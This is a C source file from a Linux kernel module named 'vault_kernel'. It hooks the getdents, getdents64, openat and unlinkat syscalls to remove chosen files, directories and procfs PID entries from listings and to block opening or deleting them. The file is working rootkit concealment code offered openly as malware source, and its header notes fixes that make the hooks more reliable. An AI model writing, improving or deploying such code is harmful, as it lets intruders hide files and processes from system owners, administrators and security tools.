/* vault_kernel - file_hide.c
 * File and directory hiding via getdents/getdents64 hook
 * Also protects hidden files from openat / unlinkat
 * ruby570bocadito © 2026
 *
 * audit-improvements:
 *  - Hooks now use the correct x86_64 syscall signature (struct pt_regs *).
 *  - Fixed getdents64/getdents output-length computation (previous version
 *    dropped the last visible entry and failed when everything was hidden).
 *  - PID-name filtering is applied only inside procfs (was a false-positive
 *    source for numeric filenames in any directory).
 */
#include "core.h"
#include <linux/magic.h>

char hidden_files[MAX_HIDDEN_FILES][256];
int hidden_file_count = 0;
static DEFINE_SPINLOCK(file_hide_lock);

/*
 * `struct linux_dirent` (legacy/native getdents layout) is private to
 * fs/readdir.c and is NOT exported to modules. Reconstruct its layout for the
 * native getdents() syscall: on x86_64 the native fields are unsigned long.
 */
struct linux_dirent_legacy {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

void file_hide_add(const char *name) {
    unsigned long flags;
    spin_lock_irqsave(&file_hide_lock, flags);
    if (hidden_file_count < MAX_HIDDEN_FILES) {
        strncpy(hidden_files[hidden_file_count], name, 255);
        hidden_files[hidden_file_count][255] = '\0';
        hidden_file_count++;
        pr_info(VAULT_KERNEL_TAG " hiding file/dir: %s\n", name);
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

void file_hide_del(const char *name) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        if (strcmp(hidden_files[i], name) == 0) {
            memmove(hidden_files[i], hidden_files[i+1],
                    (hidden_file_count - i - 1) * 256);
            hidden_file_count--;
            pr_info(VAULT_KERNEL_TAG " unhid file/dir: %s\n", name);
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

/* Match against the hidden-files list only (no proc PID check). */
static int should_hide_name(const char *name) {
    unsigned long flags;
    int i, hide = 0;

    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        /* Exact filename match */
        if (strcmp(name, hidden_files[i]) == 0) {
            hide = 1;
            break;
        }
        /* Path-based match: if hidden string contains '/', do substring */
        if (strchr(hidden_files[i], '/') && strstr(name, hidden_files[i])) {
            hide = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
    return hide;
}

int is_file_hidden(const char *name) {
    return should_hide_name(name);
}

/* Snapshot the hidden-files list under the lock (caller frees dst if heap). */
int file_hide_snapshot(char (*dst)[256], int max) {
    unsigned long flags;
    int n;
    spin_lock_irqsave(&file_hide_lock, flags);
    n = hidden_file_count < max ? hidden_file_count : max;
    if (n > 0)
        memcpy(dst, hidden_files, n * 256);
    spin_unlock_irqrestore(&file_hide_lock, flags);
    return n;
}

/* True if `fd` refers to a procfs file (so PID-name filtering applies only there). */
static int fd_is_procfs(unsigned int fd) {
    /* fget/fput is stable across kernel versions (struct fd layout changed
     * in newer kernels, breaking direct fdget().file access). */
    struct file *f = fget(fd);
    int proc = 0;
    if (f && f->f_inode && f->f_inode->i_sb)
        proc = (f->f_inode->i_sb->s_magic == PROC_SUPER_MAGIC);
    if (f)
        fput(f);
    return proc;
}

/*
 * Compaction: iterate a dirent chain in kernel memory, physically drop hidden
 * entries, and return the new byte length. The struct layouts for
 * `linux_dirent64` and the legacy `linux_dirent` are identical for the fields
 * we touch (d_reclen at offset 16, d_name at offset 18), so a single generic
 * implementation handles both.
 */
static long filter_dirents(void __user *dirp, long ret, int in_proc) {
    unsigned char *kdirp, *out;
    long off;

    kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;
    if (copy_from_user(kdirp, dirp, ret)) {
        kfree(kdirp);
        return ret;
    }

    out = kdirp;
    off = 0;
    while (off < ret) {
        unsigned short reclen = *(unsigned short *)(kdirp + off + 16);
        const char *d_name = (const char *)(kdirp + off + 18);

        /* defensive: corrupt or truncated record */
        if (reclen == 0 || off + reclen > ret)
            break;

        if (should_hide_name(d_name) ||
            (in_proc && is_proc_pid_hidden(d_name))) {
            /* drop this entry */
        } else {
            if (kdirp + off != out)
                memmove(out, kdirp + off, reclen);
            out += reclen;
        }
        off += reclen;
    }

    ret = out - kdirp;
    if (ret > 0 && copy_to_user(dirp, kdirp, ret)) {
        kfree(kdirp);
        return -EFAULT;
    }
    kfree(kdirp);
    return ret;
}

/* ================================================================
 * getdents64 hook — filter directory listing
 * ================================================================ */
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    unsigned int fd = (unsigned int)regs->di;
    struct linux_dirent64 __user *dirp = (struct linux_dirent64 __user *)regs->si;
    long (*orig)(const struct pt_regs *) = (void *)hooks[HOOKIDX_GETDENTS64].original;
    long ret;

    ret = orig(regs);
    if (ret <= 0)
        return ret;

    return filter_dirents(dirp, ret, fd_is_procfs(fd));
}

/* ================================================================
 * getdents (legacy/native) hook
 * ================================================================ */
asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    unsigned int fd = (unsigned int)regs->di;
    struct linux_dirent_legacy __user *dirp = (struct linux_dirent_legacy __user *)regs->si;
    long (*orig)(const struct pt_regs *) = (void *)hooks[HOOKIDX_GETDENTS].original;
    long ret;

    ret = orig(regs);
    if (ret <= 0)
        return ret;

    return filter_dirents(dirp, ret, fd_is_procfs(fd));
}

/* ================================================================
 * openat hook — block access to hidden files
 * ================================================================ */
asmlinkage long hooked_openat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->si;
    long (*orig)(const struct pt_regs *) = (void *)hooks[HOOKIDX_OPENAT].original;
    char kpath[256];
    char *filename;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            /* Extract filename from path */
            filename = strrchr(kpath, '/');
            if (filename)
                filename++;
            else
                filename = kpath;

            if (should_hide_name(filename) || should_hide_name(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig(regs);
}

/* ================================================================
 * unlinkat hook — prevent deletion of hidden files
 * ================================================================ */
asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
    const char __user *pathname = (const char __user *)regs->si;
    long (*orig)(const struct pt_regs *) = (void *)hooks[HOOKIDX_UNLINKAT].original;
    char kpath[256];
    char *filename;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            filename = strrchr(kpath, '/');
            if (filename) filename++; else filename = kpath;

            if (should_hide_name(filename) || should_hide_name(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig(regs);
}

int file_hide_init(void) {
    pr_info(VAULT_KERNEL_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
    return 0;
}

void file_hide_cleanup(void) {
    hidden_file_count = 0;
    pr_info(VAULT_KERNEL_TAG " file hiding cleaned\n");
}
